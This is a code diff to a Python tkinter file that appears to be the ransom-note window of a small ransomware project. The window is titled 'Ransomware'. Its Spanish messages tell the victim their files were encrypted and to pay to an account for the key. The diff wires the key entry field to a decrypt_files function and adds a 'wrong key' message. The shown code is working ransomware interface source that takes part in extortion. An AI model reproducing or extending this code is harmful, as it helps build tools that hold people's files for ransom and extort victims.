@@ -1,16 +1,19 @@
 from tkinter import *
 from tkinter import ttk
 import encrypt
-import decrypt
+from decrypt import decrypt_files
 
 
 
 def verify_key():
   key = entry.get()
-  #print(key)
-  #key.set(key_input)
-  exec(open('decrypt.py').read())
-  label4=Label(win, text="Se desencriptaron los archivos", font=("Courier 14 bold")).pack(pady=5)
+  ret = decrypt_files(key);
+  
+  if ret: 
+    label4.config(text = 'Se desencriptaron los archivos')
+  else:
+    label4.config(text = 'Clave incorrecta')
+  
   
   
   
@@ -22,10 +25,10 @@ if __name__ == '__main__':
   win.title("Ransomware")
   
   
-  label=Label(win, text="Sus archivos fueron encriptados", font=("Courier 14 bold")).pack(pady=10)
+  label1=Label(win, text="Sus archivos fueron encriptados", font=("Courier 14 bold")).pack(pady=10)
   label2=Label(win, text="Transfiera a la cuenta ... para obtener \nla clave para desencriptarlos", font=("Courier 12 bold")).pack(pady=5)
   label3=Label(win, text="Ingrese la clave", font=("Courier 14 bold")).pack(pady=5)
-
+  
   # Input del usuario
   entry= Entry(win, width= 60)
   entry.focus_set()
@@ -33,6 +36,9 @@ if __name__ == '__main__':
   
    
   ttk.Button(win, text="Aceptar",width=20, command=verify_key).pack(pady=20)
+  
+  label4=Label(win, text="", font=("Courier 14 bold"))
+  label4.pack(pady=5)
   
   win.mainloop()  
   
